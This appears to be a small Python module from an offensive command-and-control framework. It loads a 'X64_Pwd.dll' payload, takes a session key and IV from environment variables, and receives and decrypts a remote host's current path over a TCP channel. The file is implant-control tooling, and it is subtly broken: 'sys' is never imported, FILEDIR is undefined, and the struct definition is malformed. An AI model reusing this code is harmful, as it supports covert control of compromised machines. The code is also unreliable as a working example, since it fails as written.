import eternalhush as eh
from additional import clingyspider
import os

CURRENTPATH = {
    "path_length": eh.SHORT,
    "path": 254,
}

def main(args):
    clingyspider.ExecuteModule(os.path.join(FILEDIR, "X64_Pwd.dll"))
    connection = int(eh.ui.GetEnv("CLSP_CONNECTION"))
    session_key = bytearray.fromhex(eh.ui.GetEnv("CLSP_KEY"))
    next_iv = bytearray.fromhex(eh.ui.GetEnv("CLSP_IV"))
    
    encrypted_path = eh.net.TcpRecv(connection, 256)
    
    path = eh.data.Struct(CURRENTPATH)
    path.from_bytes(eh.crypto.DecryptAesData(session_key, next_iv, encrypted_path))
    length = path.path_length.get(int)
    
    current_path = path.path.get(str)[:length]
    eh.ui.Echo(current_path, eh.ECHO_DEFAULT)
    
if __name__ == "__main__":
    main(sys.argv)